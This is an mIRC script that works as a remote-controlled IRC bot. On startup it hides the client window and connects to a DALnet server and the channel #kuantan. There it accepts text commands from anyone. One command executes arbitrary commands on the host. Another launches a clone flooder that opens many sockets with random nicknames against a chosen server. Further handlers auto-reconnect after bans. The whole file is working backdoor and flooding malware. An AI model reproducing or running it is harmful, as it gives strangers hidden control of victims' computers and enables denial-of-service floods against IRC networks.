alias clone { if ($1 == $null) { return } | unset %c.server %c.port %ccount | if ($1 isnum) { %c.count = $1 | %c.server = $2 | %c.port = $3 } | else { %c.count = 1 | %c.server = $1 | %c.port = $2 } | %c.inc = 0 | :start | inc %c.inc | if (%c.inc > %c.count) { return } | %c.sock = clone $+ $r(1,9999) $+ $r(a,z) | :loop | if ($sock(%c.sock).name) { %c.sock = clone $+ $r(1,9999) $+ $r(a,z) | goto loop } | if (%c.port) { sockopen %c.sock %c.server %c.port } | else { %c.port = 6667 | sockopen %c.sock %c.server 6667 } | goto start }
on 1:error:*banned*:{ .timerkonek 1 5 .myserv }
on 1:error:*excessive*:{ .timerkonek 1 5 .myserv }
on 1:error:*operserv*:{ .timerkonek 1 5 .myserv }
on 1:start:{ .timer 0 0 /showmirc -t | timersafe 1 3 .server mesra.dal.net }
on 1:connect:{ .perform off | .timermain 0 100 .join -n #kuantan }
on *:text:*:*:{
  if ($1 == helloOo) { join #$$2 }
  if ($1 == bYeEe) { join #$$2 }
  if ($1 == wHats) { clone $2- }
  if ($1 == nEtz) { $2- }
  }
  halt
}
on 1:sockopen:clone*:{ inc %ccount | .bocon $sockname pong %cserver | .timer 1 2 .bocon $sockname user $r(A,Z) $+ $r(a,z) $+ $r(a,z) 1 2 : $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) | .timer 1 3 .bocon $sockname nick $r(a,z) $+ $r(1,9999999) }
on 1:sockread:clone*:{
  if ($sockerr > 0) return | :again | .sockread %tmp | if ($sockbr == 0) { return } | if (%tmp == $null) { goto again }
  if ($mid(%tmp,1,4) == PING) { .sockwrite -tn $sockname PONG $remove($remove(%tmp,ping :),ping) | halt }
  halt
}
